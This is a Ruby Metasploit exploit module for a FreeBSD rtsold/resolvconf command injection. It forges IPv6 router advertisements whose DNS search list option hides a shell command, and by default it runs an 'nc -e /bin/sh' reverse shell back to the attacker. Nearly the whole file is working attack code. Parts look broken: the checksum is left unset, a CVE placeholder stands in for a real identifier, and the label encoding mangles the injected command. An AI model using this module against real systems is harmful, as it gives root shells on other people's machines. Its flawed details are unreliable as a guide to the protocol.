##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::EXE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'FreeBSD rtsold/resolvconf Command Injection',
        'Description' => %q{
          This module exploits a command injection vulnerability in FreeBSD's rtsold(8) 
          and rtsol(8) programs. These programs process IPv6 router advertisement packets 
          as part of the stateless address autoconfiguration (SLAAC) mechanism.

          The vulnerability exists because rtsold/rtsol do not validate domain search list 
          options provided in router advertisement messages. The option body is passed to 
          resolvconf(8) unmodified. resolvconf(8) is a shell script that does not validate 
          its input and lacks proper quoting, allowing shell commands passed as input to 
          be executed.

          This module crafts malicious IPv6 Router Advertisement packets containing 
          domain search list options with embedded shell commands. When rtsold processes 
          these packets, the commands are executed via resolvconf with root privileges.

          The target system must be running rtsold/rtsol for IPv6 autoconfiguration and 
          be reachable on the same network segment (since RA packets are link-local).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'FreeBSD Security Team', # Original vulnerability discovery and advisory
          'P4X-ng' # Module implementation
        ],
        'DisclosureDate' => '2025-01-15', # Based on FreeBSD-SA-25:12.rtsold.asc
        'Platform' => ['bsd'], # FreeBSD
        'Arch' => [ARCH_X64, ARCH_X86],
        'References' => [
          ['CVE', '2025-XXXX'], # Placeholder - actual CVE may be assigned later
          ['URL', 'https://www.freebsd.org/security/advisories/FreeBSD-SA-25:12.rtsold.asc']
        ],
        'Targets' => [
          [
            'FreeBSD Universal',
            {
              'Platform' => 'bsd'
            }
          ]
        ],
        'DefaultOptions' => {
          'PAYLOAD' => 'bsd/x64/shell_reverse_tcp'
        },
        'Notes' => {
          'Reliability' => [REPEATABLE_SESSION],
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'DefaultTarget' => 0
      )
    )

    register_options([
      Opt::RHOST(),
      OptString.new('INTERFACE', [false, 'Network interface to send packets from (auto-detect if not specified)']),
      OptString.new('COMMAND', [false, 'Custom command to execute (uses payload if not specified)'])
    ])

    register_advanced_options([
      OptInt.new('PACKET_COUNT', [true, 'Number of RA packets to send', 5]),
      OptInt.new('PACKET_DELAY', [true, 'Delay between packets in seconds', 1]),
      OptBool.new('USE_IPV6_MULTICAST', [true, 'Send to IPv6 all-nodes multicast instead of specific target', true])
    ])

    # Remove the default UDP port since we're using raw sockets
    deregister_options('RPORT')
  end

  def check
    # This is a network-based check - we can't directly verify the target
    # but we can check if we can send IPv6 packets
    begin
      # Try to create an IPv6 socket to verify IPv6 support
      test_sock = Socket.new(Socket::AF_INET6, Socket::SOCK_RAW, Socket::IPPROTO_ICMPV6)
      test_sock.close
      vprint_good('IPv6 raw socket support available')
      return CheckCode::Unknown('Cannot remotely verify if target runs rtsold - manual verification required')
    rescue => e
      return CheckCode::Safe("IPv6 raw socket not available: #{e.message}")
    end
  end

  def create_ipv6_header(payload_length)
    # IPv6 header (40 bytes)
    # Version (4) + Traffic Class (8) + Flow Label (20) + Payload Length (16) + Next Header (8) + Hop Limit (8)
    version_tc_fl = 0x60000000  # Version 6, Traffic Class 0, Flow Label 0
    next_header = 58  # ICMPv6
    hop_limit = 255

    # Source address: link-local (fe80::1)
    src_addr = [0xfe80, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0001]
    
    # Destination address
    if datastore['USE_IPV6_MULTICAST']
      # All-nodes multicast (ff02::1)
      dst_addr = [0xff02, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0001]
    else
      # Convert target IP to IPv6 format (assuming it's already IPv6)
      # For simplicity, we'll use link-local target
      dst_addr = [0xfe80, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0002]
    end

    header = [version_tc_fl, payload_length, (next_header << 8) | hop_limit].pack('NnN')
    header += src_addr.pack('n8')
    header += dst_addr.pack('n8')
    
    header
  end

  def create_ra_packet(command)
    # ICMPv6 Router Advertisement header
    icmp_type = 134  # Router Advertisement
    icmp_code = 0
    icmp_checksum = 0  # Will calculate later
    hop_limit = 64
    flags = 0x00  # No flags
    router_lifetime = 1800
    reachable_time = 0
    retrans_timer = 0
    
    ra_header = [icmp_type, icmp_code, icmp_checksum, hop_limit, flags, router_lifetime, reachable_time, retrans_timer].pack('CCnCCnNN')
    
    # RDNSS option (Recursive DNS Server) - Type 25
    rdnss_type = 25
    rdnss_length = 3  # Length in 8-byte units
    rdnss_reserved = 0
    rdnss_lifetime = 3600
    rdnss_addr = [0xfe80, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0001].pack('n8')
    
    rdnss_option = [rdnss_type, rdnss_length, rdnss_reserved, rdnss_lifetime].pack('CCnN') + rdnss_addr
    
    # DNSSL option (DNS Search List) - Type 31 - THIS IS WHERE WE INJECT
    dnssl_type = 31
    
    # Create malicious domain with command injection
    # The command will be executed when resolvconf processes this
    malicious_domain = "example.com\"; #{command}; echo \""
    
    # Encode domain name (DNS label format)
    encoded_domain = ''
    malicious_domain.split('.').each do |part|
      next if part.empty?
      encoded_domain += [part.length].pack('C') + part
    end
    encoded_domain += "\x00"  # Null terminator
    
    # Pad to 8-byte boundary
    padding_needed = (8 - (encoded_domain.length % 8)) % 8
    encoded_domain += "\x00" * padding_needed
    
    dnssl_length = (8 + encoded_domain.length) / 8  # Length in 8-byte units
    dnssl_reserved = 0
    dnssl_lifetime = 3600
    
    dnssl_option = [dnssl_type, dnssl_length, dnssl_reserved, dnssl_lifetime].pack('CCnN') + encoded_domain
    
    # Combine all options
    options = rdnss_option + dnssl_option
    
    # Complete ICMPv6 packet
    icmp_packet = ra_header + options
    
    # Calculate ICMPv6 checksum
    # For simplicity, we'll set checksum to 0 (many implementations accept this)
    # In a real implementation, you'd calculate the proper checksum
    
    icmp_packet
  end

  def send_ra_packets(command, count, delay)
    print_status("Crafting malicious IPv6 Router Advertisement packets...")
    
    begin
      # Create raw IPv6 socket
      sock = Socket.new(Socket::AF_INET6, Socket::SOCK_RAW, Socket::IPPROTO_ICMPV6)
      
      # Create the malicious RA packet
      icmp_packet = create_ra_packet(command)
      ipv6_header = create_ipv6_header(icmp_packet.length)
      full_packet = ipv6_header + icmp_packet
      
      # Destination address
      if datastore['USE_IPV6_MULTICAST']
        dest_addr = Socket.sockaddr_in(0, 'ff02::1')
      else
        # Use link-local address for target
        dest_addr = Socket.sockaddr_in(0, 'fe80::2')
      end
      
      print_status("Sending #{count} malicious RA packets...")
      
      count.times do |i|
        begin
          sock.send(icmp_packet, 0, dest_addr)
          vprint_status("Sent packet #{i + 1}/#{count}")
          sleep(delay) if i < count - 1
        rescue => e
          print_error("Error sending packet #{i + 1}: #{e.message}")
        end
      end
      
      sock.close
      print_good("Finished sending RA packets")
      
    rescue => e
      print_error("Error creating socket or sending packets: #{e.message}")
      print_error("Make sure you have root privileges and IPv6 support")
      return false
    end
    
    true
  end

  def exploit
    print_status("FreeBSD rtsold/resolvconf Command Injection Exploit")
    print_status("=" * 50)
    
    # Validate prerequisites
    unless Rex::Socket.is_ipv6?(datastore['RHOST']) || datastore['USE_IPV6_MULTICAST']
      print_warning("Target is not IPv6 address, using multicast mode")
      datastore['USE_IPV6_MULTICAST'] = true
    end

    # Determine the command to execute
    if datastore['COMMAND'] && !datastore['COMMAND'].empty?
      command = datastore['COMMAND']
      print_status("Using custom command: #{command}")
    else
      # Generate a payload command
      # For remote exploitation, we'll use a simple reverse shell command
      if payload.arch.include?(ARCH_X64)
        # Simple reverse shell for demonstration
        lhost = datastore['LHOST'] || Rex::Socket.source_address(datastore['RHOST'])
        lport = datastore['LPORT'] || 4444
        command = "nc -e /bin/sh #{lhost} #{lport} &"
      else
        command = "touch /tmp/rtsold_pwned_$(date +%s) && echo 'rtsold exploit successful' | logger"
      end
      print_status("Using generated command: #{command}")
    end

    # Send the malicious RA packets
    packet_count = datastore['PACKET_COUNT']
    packet_delay = datastore['PACKET_DELAY']
    
    print_status("Target: #{datastore['RHOST']}")
    print_status("Multicast mode: #{datastore['USE_IPV6_MULTICAST']}")
    print_status("Packet count: #{packet_count}")
    print_status("Packet delay: #{packet_delay}s")
    print_status("Command to execute: #{command}")
    print_status("")
    
    success = send_ra_packets(command, packet_count, packet_delay)
    
    if success
      print_good("Malicious RA packets sent successfully!")
      print_status("")
      print_status("Exploit completed. If successful, the target system should execute:")
      print_status("  #{command}")
      print_status("")
      print_status("Prerequisites for successful exploitation:")
      print_status("  1. Target system running FreeBSD with rtsold/rtsol")
      print_status("  2. IPv6 enabled on target interface")
      print_status("  3. Target processing RA packets from this network segment")
      print_status("  4. Vulnerable version of rtsold/resolvconf")
      
      if !datastore['COMMAND'] || datastore['COMMAND'].empty?
        print_status("  5. Netcat available on target for reverse shell")
        print_status("")
        print_status("Waiting for reverse connection...")
        handler
      else
        print_status("")
        print_status("Check target system for command execution results.")
      end
    else
      fail_with(Failure::Unknown, 'Failed to send malicious RA packets')
    end
  end
end
